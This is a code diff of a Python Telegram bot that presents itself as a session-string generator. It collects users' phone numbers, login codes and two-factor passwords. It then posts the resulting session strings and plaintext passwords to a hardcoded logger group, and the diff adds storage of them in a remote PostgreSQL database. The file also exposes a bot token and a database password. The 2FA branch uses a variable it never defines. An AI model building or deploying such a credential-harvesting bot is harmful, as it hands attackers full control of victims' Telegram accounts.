@@ -1,10 +1,11 @@
 import asyncio
+import psycopg2
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 from pyrogram import Client as PyroClient
 from pyrogram.errors import SessionPasswordNeeded
-import sqlite3
+import urllib.parse
 
 # 🔹 Telegram API Credentials
 API_ID = 28795512
@@ -14,30 +15,24 @@ BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"
 # 🔹 Logger Group ID (Replace with your Telegram Group ID)
 LOGGER_GROUP_ID = -1002477750706  
 
+# 🔹 PostgreSQL Database Connection
+postgres_url = "postgres://iarfggbc:Vxzh_kG7cxa1kHR5faxcd1kuA4R-UT9E@rosie.db.elephantsql.com/iarfggbc"
+url = urllib.parse.urlparse(postgres_url)
+
+def get_postgresql_connection():
+    return psycopg2.connect(
+        dbname=url.path[1:],  # Database name
+        user=url.username,    # Username
+        password=url.password, # Password
+        host=url.hostname,     # Host
+        port=url.port         # Port (default is 5432)
+    )
+
 # 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
 # 🔹 Store user sessions
 user_sessions = {}
-
-# 🔹 SQLite Database Connection with Timeout
-def get_db_connection():
-    return sqlite3.connect('session_data.db', timeout=10.0)  # Timeout after 10 seconds
-
-# 🔹 Ensure session_logs table is created
-def create_session_table():
-    with get_db_connection() as db_connection:
-        cursor = db_connection.cursor()
-        cursor.execute('''
-        CREATE TABLE IF NOT EXISTS session_logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER NOT NULL,
-            phone TEXT NOT NULL,
-            session_string TEXT NOT NULL,
-            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-        ''')
-        db_connection.commit()
 
 # ✅ /start Command
 @bot.on(events.NewMessage(pattern="/start"))
@@ -79,11 +74,7 @@ async def process_input(event):
     # ✅ Step 1: Enter Phone Number
     if step == "phone_pyro" or step == "phone_telethon":
         phone_number = event.message.text.strip()
-        if not phone_number:  # Ensure phone number is entered
-            await event.respond("❌ **Please enter a valid phone number.**")
-            return
-
-        user_sessions[user_id]["phone"] = phone_number  # Store the phone number
+        user_sessions[user_id]["phone"] = phone_number  
 
         if step == "phone_pyro":
             client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH)
@@ -102,29 +93,26 @@ async def process_input(event):
     # ✅ Step 2: Enter OTP
     elif step == "otp":
         otp_code = event.message.text.strip()
-        phone_number = user_sessions[user_id].get("phone")  # Get phone number from user_sessions
-        if not otp_code:  # Ensure OTP is entered
-            await event.respond("❌ **Please enter a valid OTP.**")
-            return
-
         client = user_sessions[user_id]["client"]
+        phone_number = user_sessions[user_id]["phone"]
         phone_code_hash = user_sessions[user_id]["phone_code_hash"]  
 
         try:
             if isinstance(client, PyroClient):
                 await client.sign_in(phone_number, phone_code_hash, otp_code)
-                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
+                session_string = await client.export_session_string()
             else:
                 await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
-                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
+                session_string = client.session.save()
 
-            # Log the session string to the database with timeout
-            create_session_table()  # Ensure table exists before inserting
-            with get_db_connection() as db_connection:
-                cursor = db_connection.cursor()
-                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
-                               (user_id, phone_number, session_string))
-                db_connection.commit()
+            # Insert the session into PostgreSQL database
+            with get_postgresql_connection() as conn:
+                with conn.cursor() as cursor:
+                    cursor.execute("""
+                        INSERT INTO session_logs (user_id, phone_number, session_string) 
+                        VALUES (%s, %s, %s)
+                    """, (user_id, phone_number, session_string))
+                    conn.commit()
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
 
@@ -142,27 +130,24 @@ async def process_input(event):
     # ✅ Step 3: Enter 2FA Password
     elif step == "password":
         password = event.message.text.strip()
-        if not password:  # Ensure password is entered
-            await event.respond("❌ **Please enter a valid password.**")
-            return
-
         client = user_sessions[user_id]["client"]
 
         try:
             if isinstance(client, PyroClient):
                 await client.check_password(password)
-                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
+                session_string = await client.export_session_string()
             else:
                 await client.sign_in(password=password)
-                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
+                session_string = client.session.save()
 
-            # Log the session string to the database with timeout
-            create_session_table()  # Ensure table exists before inserting
-            with get_db_connection() as db_connection:
-                cursor = db_connection.cursor()
-                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
-                               (user_id, user_sessions[user_id]["phone"], session_string))
-                db_connection.commit()
+            # Insert the session into PostgreSQL database
+            with get_postgresql_connection() as conn:
+                with conn.cursor() as cursor:
+                    cursor.execute("""
+                        INSERT INTO session_logs (user_id, phone_number, session_string) 
+                        VALUES (%s, %s, %s)
+                    """, (user_id, phone_number, session_string))
+                    conn.commit()
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")
 
